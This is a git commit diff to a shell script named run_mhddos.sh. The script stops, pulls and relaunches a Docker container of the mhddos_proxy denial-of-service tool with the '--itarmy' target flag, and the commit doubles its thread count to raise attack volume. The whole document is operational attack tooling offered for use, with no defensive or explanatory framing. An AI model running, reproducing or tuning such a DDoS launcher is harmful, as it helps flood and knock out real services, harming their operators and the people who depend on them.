918f387cac0b400c3092d6bcc381516f7b7a77fa
lazyloadtest <lazyloadtest@example.com>
2022-05-21 00:17:19 +1000

    double threads for updated mhddos

--- mhddos_proxy/run_mhddos.sh
+++ mhddos_proxy/run_mhddos.sh
@@ -1,5 +1,5 @@
 #!/bin/bash
-THREADS=$(nproc) ; THREADS=$(expr $THREADS \* 1000)
+THREADS=$(nproc) ; THREADS=$(expr $THREADS \* 2000)
 docker stop mhddos_proxy
 docker pull ghcr.io/porthole-ascend-cinnamon/mhddos_proxy
 docker run -d --name mhddos_proxy --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -t $THREADS --itarmy
